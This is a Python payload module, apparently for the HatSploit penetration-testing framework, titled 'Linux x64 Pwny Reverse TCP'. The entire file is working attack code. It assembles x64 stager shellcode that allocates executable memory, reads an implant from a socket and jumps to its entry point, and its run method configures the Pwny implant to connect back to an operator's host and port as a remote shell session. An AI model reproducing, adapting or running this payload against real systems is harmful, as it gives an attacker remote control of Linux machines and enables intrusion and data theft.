#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

from pwny import Pwny
from pwny.session import PwnySession

from pex.assembler import Assembler
from pex.exe import ELF

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload, Pwny, Assembler, ELF):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Linux x64 Pwny Reverse TCP",
            'Payload': "linux/x64/pwny_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Description': "Linux x64 Pwny Reverse TCP",
            'Architecture': "x64",
            'Platform': "linux",
            'Session': PwnySession,
            'Rank': "high",
            'Type': "reverse_tcp"
        }

    def phase(self):
        implant = self.implant()
        length = len(implant)
        e_entry = self.get_header(implant)['e_entry']

        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                push rdi

                push 0x9
                pop rax
                xor rdi, rdi
                push {hex(length)}
                pop rsi
                push 0x7
                pop rdx
                xor r9, r9
                push 0x22
                pop r10
                syscall

                xchg rdx, rsi
                xchg rsi, rax
                push 0x2d
                pop rax
                pop rdi
                push 0x100
                pop r10
                syscall

                and rsp, -0x10
                add sp, 80
                push 0x70
                mov rcx, rsp
                xor rbx, rbx
                push rbx
                push rbx
                push rsi
                push 0x7
                push rbx
                push rbx
                push rdi
                push rcx
                push 0x2

                push {hex(e_entry)}
                pop rax
                add rsi, rax
                jmp rsi
            """
        )

    def implant(self):
        return self.get_implant(
            self.details['Platform'],
            self.details['Architecture']
        )

    def run(self):
        return self.get_pwny(
            self.details['Platform'],
            self.details['Architecture'],
            {
                'host': self.handler['RHOST'],
                'port': self.handler['RPORT'],
                'type': self.details['Type']
            }
        )
